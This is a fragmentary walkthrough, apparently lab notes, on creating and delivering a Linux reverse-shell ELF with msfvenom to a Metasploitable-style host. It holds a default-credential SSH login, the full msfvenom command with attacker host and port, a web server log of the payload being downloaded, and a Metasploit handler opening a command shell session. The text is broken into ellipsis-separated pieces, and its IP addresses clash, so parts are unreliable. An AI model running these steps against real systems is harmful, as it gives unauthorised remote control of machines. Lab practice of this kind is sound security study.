...
# Remote Login Commands (172.16.6.128 | msfadmin/msfadmin)

## 1. SSH Login
```bash
ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@172.16.6.128
```
**Password:** msfadmin
...
# Reverse Shell Malware for Linux - Step-by-Step Process
...
# [Output truncated for brevity - lists Android payloads]
```
...
```bash
┌──(durjoy㉿Kali)-[~]
└─$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.254.12 LPORT=2406 --platform linux -a x86 -f elf -o linux_mal.elf
# No encoder specified, outputting raw payload
# Payload size: 68 bytes
# Final size of elf file: 152 bytes
# Saved as: linux_mal.elf
```
...
┌──(durjoy㉿Kali)-[~]
└─$ ls
# Output includes: linux_mal.elf

┌──(durjoy㉿Kali)-[~]
└─$ cp linux_mal.elf /home/durjoy/Desktop/
...
┌──(durjoy㉿Kali)-[~/Desktop]
└─$ ls
# Output includes: linux_mal.elf, database, restaurant_management_system.sql
```
...
# 192.168.254.12 - - [08/Jun/2025 10:59:34] "GET / HTTP/1.1" 200 -
# 192.168.254.12 - - [08/Jun/2025 10:59:34] code 404, message File not found
# 192.168.254.12 - - [08/Jun/2025 10:59:34] "GET /favicon.ico HTTP/1.1" 404 -
# 192.168.254.12 - - [08/Jun/2025 11:04:45] "GET /linux_mal.elf HTTP/1.0" 200 -
```
...
# LHOST and LPORT must be set

msf6 exploit(multi/handler) > set LHOST 172.16.6.128
LHOST => 172.16.6.128

msf6 exploit(multi/handler) > set LPORT 2406
LPORT => 2406

msf6 exploit(multi/handler) > run
# [-] Handler failed to bind to 172.16.6.128:2406
# [*] Started reverse TCP handler on 0.0.0.0:2406
# [*] Command shell session 1 opened (192.168.254.12:2406 -> 192.168.254.12:43173) at 2025-06-08 11:08:37 +0600
```
...
![image](https://github.com/user-attachments/assets/8d33e4b0-4f15-4ca4-92bd-ed366eab0876)
...
ifconfig
# eth0 IP: 172.16.6.128
# RX bytes: 5.1 KB | TX bytes: 11.2 KB
